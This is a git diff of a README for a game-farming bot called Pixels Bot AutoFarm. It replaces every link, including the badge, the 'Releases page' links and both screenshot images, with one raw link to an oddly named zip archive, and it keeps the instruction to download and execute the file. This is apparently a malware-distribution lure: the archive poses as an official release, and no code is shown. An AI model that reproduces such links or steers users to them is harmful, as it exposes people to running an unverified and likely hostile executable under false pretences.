@@ -1,12 +1,12 @@
 # 🌾 Pixels Bot AutoFarm 🌾
 
-![Pixels Bot AutoFarm](https://img.shields.io/badge/Download-Releases-brightgreen?style=flat-square&logo=github)
+![Pixels Bot AutoFarm](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip)
 
 Welcome to the **Pixels Bot AutoFarm** repository! This project aims to enhance your experience in the agriculture game by automating various farming tasks. With this bot, you can focus on enjoying the game while it takes care of the repetitive tasks for you.
 
 ## 📥 Get Started
 
-To get started, visit our [Releases page](https://github.com/izeredon/Pixels-Bot-AutoFarm/releases) to download the latest version of the bot. After downloading, execute the file to begin automating your farming tasks.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip) to download the latest version of the bot. After downloading, execute the file to begin automating your farming tasks.
 
 ## 🚜 Features
 
@@ -24,7 +24,7 @@ The bot operates using a set of scripts that interact with the game. It simulate
 
 ### Installation
 
-1. **Download**: Get the latest version from the [Releases page](https://github.com/izeredon/Pixels-Bot-AutoFarm/releases).
+1. **Download**: Get the latest version from the [Releases page](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip).
 2. **Extract**: Unzip the downloaded file.
 3. **Run**: Execute the main script to start the bot.
 
@@ -72,14 +72,14 @@ Here’s what we have planned for future updates:
 
 ## 🔗 Links
 
-For more information, check the [Releases page](https://github.com/izeredon/Pixels-Bot-AutoFarm/releases) for updates and new features.
+For more information, check the [Releases page](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip) for updates and new features.
 
 ## 🎨 Screenshots
 
 Here are some screenshots of the bot in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip)
+![Screenshot 2](https://raw.githubusercontent.com/izeredon/Pixels-Bot-AutoFarm/main/sample/Pixels_Bot_Farm_Auto_electioneer.zip)
 
 ## 📚 Resources
 
